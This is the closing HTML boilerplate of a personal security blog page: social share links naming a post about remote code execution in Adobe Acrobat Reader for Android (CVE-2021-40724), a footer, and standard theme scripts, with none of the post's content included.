            href="https://x.com/intent/tweet/?text=RCE%20in%20Adobe%20Acrobat%20Reader%20for%20android%28CVE-2021-40724%29&amp;url=https%3a%2f%2fhulkvision.github.io%2fblog%2fpost1%2f&amp;hashtags=">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M512 62.554 L 512 449.446 C 512 483.97 483.97 512 449.446 512 L 62.554 512 C 28.03 512 0 483.97 0 449.446 L 0 62.554 C 0 28.03 28.029 0 62.554 0 L 449.446 0 C 483.971 0 512 28.03 512 62.554 Z M 269.951 190.75 L 182.567 75.216 L 56 75.216 L 207.216 272.95 L 63.9 436.783 L 125.266 436.783 L 235.9 310.383 L 332.567 436.783 L 456 436.783 L 298.367 228.367 L 432.367 75.216 L 371.033 75.216 Z M 127.633 110 L 164.101 110 L 383.481 400.065 L 349.5 400.065 Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share RCE in Adobe Acrobat Reader for android(CVE-2021-40724) on linkedin"
            href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fhulkvision.github.io%2fblog%2fpost1%2f&amp;title=RCE%20in%20Adobe%20Acrobat%20Reader%20for%20android%28CVE-2021-40724%29&amp;summary=RCE%20in%20Adobe%20Acrobat%20Reader%20for%20android%28CVE-2021-40724%29&amp;source=https%3a%2f%2fhulkvision.github.io%2fblog%2fpost1%2f">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share RCE in Adobe Acrobat Reader for android(CVE-2021-40724) on reddit"
            href="https://reddit.com/submit?url=https%3a%2f%2fhulkvision.github.io%2fblog%2fpost1%2f&title=RCE%20in%20Adobe%20Acrobat%20Reader%20for%20android%28CVE-2021-40724%29">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-3.446,265.638c0,-22.964 -18.616,-41.58 -41.58,-41.58c-11.211,0 -21.361,4.457 -28.841,11.666c-28.424,-20.508 -67.586,-33.757 -111.204,-35.278l18.941,-89.121l61.884,13.157c0.756,15.734 13.642,28.29 29.56,28.29c16.407,0 29.706,-13.299 29.706,-29.701c0,-16.403 -13.299,-29.702 -29.706,-29.702c-11.666,0 -21.657,6.792 -26.515,16.578l-69.105,-14.69c-1.922,-0.418 -3.939,-0.042 -5.585,1.036c-1.658,1.073 -2.811,2.761 -3.224,4.686l-21.152,99.438c-44.258,1.228 -84.046,14.494 -112.837,35.232c-7.468,-7.164 -17.589,-11.591 -28.757,-11.591c-22.965,0 -41.585,18.616 -41.585,41.58c0,16.896 10.095,31.41 24.568,37.918c-0.639,4.135 -0.99,8.328 -0.99,12.576c0,63.977 74.469,115.836 166.33,115.836c91.861,0 166.334,-51.859 166.334,-115.836c0,-4.218 -0.347,-8.387 -0.977,-12.493c14.564,-6.47 24.735,-21.034 24.735,-38.001Zm-119.474,108.193c-20.27,20.241 -59.115,21.816 -70.534,21.816c-11.428,0 -50.277,-1.575 -70.522,-21.82c-3.007,-3.008 -3.007,-7.882 0,-10.889c3.003,-2.999 7.882,-3.003 10.885,0c12.777,12.781 40.11,17.317 59.637,17.317c19.522,0 46.86,-4.536 59.657,-17.321c3.016,-2.999 7.886,-2.995 10.885,0.008c3.008,3.011 3.003,7.882 -0.008,10.889Zm-5.23,-48.781c-16.373,0 -29.701,-13.324 -29.701,-29.698c0,-16.381 13.328,-29.714 29.701,-29.714c16.378,0 29.706,13.333 29.706,29.714c0,16.374 -13.328,29.698 -29.706,29.698Zm-160.386,-29.702c0,-16.381 13.328,-29.71 29.714,-29.71c16.369,0 29.689,13.329 29.689,29.71c0,16.373 -13.32,29.693 -29.689,29.693c-16.386,0 -29.714,-13.32 -29.714,-29.693Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share RCE in Adobe Acrobat Reader for android(CVE-2021-40724) on facebook"
            href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fhulkvision.github.io%2fblog%2fpost1%2f">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-106.468,0l0,-192.915l66.6,0l12.672,-82.621l-79.272,0l0,-53.617c0,-22.603 11.073,-44.636 46.58,-44.636l36.042,0l0,-70.34c0,0 -32.71,-5.582 -63.982,-5.582c-65.288,0 -107.96,39.569 -107.96,111.204l0,62.971l-72.573,0l0,82.621l72.573,0l0,192.915l-191.104,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share RCE in Adobe Acrobat Reader for android(CVE-2021-40724) on whatsapp"
            href="https://api.whatsapp.com/send?text=RCE%20in%20Adobe%20Acrobat%20Reader%20for%20android%28CVE-2021-40724%29%20-%20https%3a%2f%2fhulkvision.github.io%2fblog%2fpost1%2f">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-58.673,127.703c-33.842,-33.881 -78.847,-52.548 -126.798,-52.568c-98.799,0 -179.21,80.405 -179.249,179.234c-0.013,31.593 8.241,62.428 23.927,89.612l-25.429,92.884l95.021,-24.925c26.181,14.28 55.659,21.807 85.658,21.816l0.074,0c98.789,0 179.206,-80.413 179.247,-179.243c0.018,-47.895 -18.61,-92.93 -52.451,-126.81Zm-126.797,275.782l-0.06,0c-26.734,-0.01 -52.954,-7.193 -75.828,-20.767l-5.441,-3.229l-56.386,14.792l15.05,-54.977l-3.542,-5.637c-14.913,-23.72 -22.791,-51.136 -22.779,-79.287c0.033,-82.142 66.867,-148.971 149.046,-148.971c39.793,0.014 77.199,15.531 105.329,43.692c28.128,28.16 43.609,65.592 43.594,105.4c-0.034,82.149 -66.866,148.983 -148.983,148.984Zm81.721,-111.581c-4.479,-2.242 -26.499,-13.075 -30.604,-14.571c-4.105,-1.495 -7.091,-2.241 -10.077,2.241c-2.986,4.483 -11.569,14.572 -14.182,17.562c-2.612,2.988 -5.225,3.364 -9.703,1.12c-4.479,-2.241 -18.91,-6.97 -36.017,-22.23c-13.314,-11.876 -22.304,-26.542 -24.916,-31.026c-2.612,-4.484 -0.279,-6.908 1.963,-9.14c2.016,-2.007 4.48,-5.232 6.719,-7.847c2.24,-2.615 2.986,-4.484 4.479,-7.472c1.493,-2.99 0.747,-5.604 -0.374,-7.846c-1.119,-2.241 -10.077,-24.288 -13.809,-33.256c-3.635,-8.733 -7.327,-7.55 -10.077,-7.688c-2.609,-0.13 -5.598,-0.158 -8.583,-0.158c-2.986,0 -7.839,1.121 -11.944,5.604c-4.105,4.484 -15.675,15.32 -15.675,37.364c0,22.046 16.048,43.342 18.287,46.332c2.24,2.99 31.582,48.227 76.511,67.627c10.685,4.615 19.028,7.371 25.533,9.434c10.728,3.41 20.492,2.929 28.209,1.775c8.605,-1.285 26.499,-10.833 30.231,-21.295c3.732,-10.464 3.732,-19.431 2.612,-21.298c-1.119,-1.869 -4.105,-2.99 -8.583,-5.232Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share RCE in Adobe Acrobat Reader for android(CVE-2021-40724) on telegram"
            href="https://telegram.me/share/url?text=RCE%20in%20Adobe%20Acrobat%20Reader%20for%20android%28CVE-2021-40724%29&amp;url=https%3a%2f%2fhulkvision.github.io%2fblog%2fpost1%2f">
            <svg version="1.1" xml:space="preserve" viewBox="2 2 28 28" height="30px" width="30px" fill="currentColor">
                <path
                    d="M26.49,29.86H5.5a3.37,3.37,0,0,1-2.47-1,3.35,3.35,0,0,1-1-2.47V5.48A3.36,3.36,0,0,1,3,3,3.37,3.37,0,0,1,5.5,2h21A3.38,3.38,0,0,1,29,3a3.36,3.36,0,0,1,1,2.46V26.37a3.35,3.35,0,0,1-1,2.47A3.38,3.38,0,0,1,26.49,29.86Zm-5.38-6.71a.79.79,0,0,0,.85-.66L24.73,9.24a.55.55,0,0,0-.18-.46.62.62,0,0,0-.41-.17q-.08,0-16.53,6.11a.59.59,0,0,0-.41.59.57.57,0,0,0,.43.52l4,1.24,1.61,4.83a.62.62,0,0,0,.63.43.56.56,0,0,0,.4-.17L16.54,20l4.09,3A.9.9,0,0,0,21.11,23.15ZM13.8,20.71l-1.21-4q8.72-5.55,8.78-5.55c.15,0,.23,0,.23.16a.18.18,0,0,1,0,.06s-2.51,2.3-7.52,6.8Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share RCE in Adobe Acrobat Reader for android(CVE-2021-40724) on ycombinator"
            href="https://news.ycombinator.com/submitlink?t=RCE%20in%20Adobe%20Acrobat%20Reader%20for%20android%28CVE-2021-40724%29&u=https%3a%2f%2fhulkvision.github.io%2fblog%2fpost1%2f">
            <svg version="1.1" xml:space="preserve" width="30px" height="30px" viewBox="0 0 512 512" fill="currentColor"
                xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape">
                <path
                    d="M449.446 0C483.971 0 512 28.03 512 62.554L512 449.446C512 483.97 483.97 512 449.446 512L62.554 512C28.03 512 0 483.97 0 449.446L0 62.554C0 28.03 28.029 0 62.554 0L449.446 0ZM183.8767 87.9921H121.8427L230.6673 292.4508V424.0079H281.3328V292.4508L390.1575 87.9921H328.1233L256 238.2489z" />
            </svg>
        </a>
    </li>
</ul>

  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2024 <a href="https://hulkvision.github.io/">hulkvision</a></span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
